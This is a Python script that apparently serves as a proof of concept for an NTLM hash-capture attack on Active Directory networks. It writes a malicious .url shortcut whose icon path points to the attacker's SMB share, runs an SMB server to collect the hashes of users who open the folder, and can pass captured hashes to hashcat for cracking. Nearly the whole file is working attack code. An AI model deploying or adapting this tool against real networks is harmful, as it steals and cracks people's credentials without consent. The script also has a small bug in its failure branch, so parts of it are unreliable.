#This script is for linux only !
from subprocess import PIPE, Popen
import time
import os
import signal
import threading

iface = input("name of the interface connected to the AD network: ")
#set to True to enable cracking
crackhashes = False
#avoid using big wordlist
wordlist_path = ""

lock = threading.Lock()

#this get your local ip
ip = str(Popen("ip -4 addr show "+iface+" | grep -oP '(?<=inet\\s)\\d+(\\.\\d+){3}'",shell=True,stdout=PIPE).stdout.read()).replace("b'","").replace("'","").replace("\\n","")
if len(ip)<2:
    raise Exception("Wrong interface/no ip")

tofile = f"[InternetShortcut]\nURL={ip}\nWorkingDirectory=\\\\{ip}\\icon\\\nIconFile=\\\\{ip}\\icon\\icon.ico\nIconIndex=1"
f=open("PoC_shortcut.url","w")
f.write(tofile)
f.close()
print("payload written to \"PoC_shortcut.url\"")
print("PAYLOAD\n-------------------\n"+tofile+"\n-------------------")
def crack(hashtocrack):
    lock.acquire()
    #This is the hashcat comment used to crack hashes.
    #feel free to modify it
    Popen(f"hashcat \'{hashtocrack}\' {wordlist_path} -O -m 5500 -w 4 >/dev/null 2>&1",shell=True)
    time.sleep(3)
    cracked = str(Popen(f"hashcat \'{hashtocrack}\' -m 5500 --show 2>/dev/null",shell=True,stdout=PIPE).stdout.read()).replace("b'","").replace("'","")
    if len(cracked) > 2:
        username = hashtocrack.split(":")[0]
        password = cracked.split(":")[-1].replace("\\n","")
        print("[+] cracked !")
        print(f"[+] username: {username}")
        print(f"[+] password: {password}")
        print("")
    else:
        print(username,"[x] not cracked")
        print("")
    lock.release()



try:
    p = Popen(f'python smbserver.py -ip {ip} -smb2support icon icon',shell=True,stdout=PIPE)
    time.sleep(2)
    
    print("STARTED!")

    
    while True:
        stdout = str(p.stdout.readline()).replace("b'","").replace("'","")
        smbserver_output = stdout.replace("\\n","").replace("[*] ","") if stdout.count(":") == 5 else False
        
        if smbserver_output:
                print("[+] got a hash! -> "+smbserver_output)
                if crackhashes:
                    print("[+] trying to crack it...")
                    threading._start_new_thread(crack,(smbserver_output,))
        

except Exception as e:
    print(e)
    #kills the smbserver when an error occurs
    os.killpg(os.getpgid(p.pid), signal.SIGTERM)

os.killpg(os.getpgid(p.pid), signal.SIGTERM)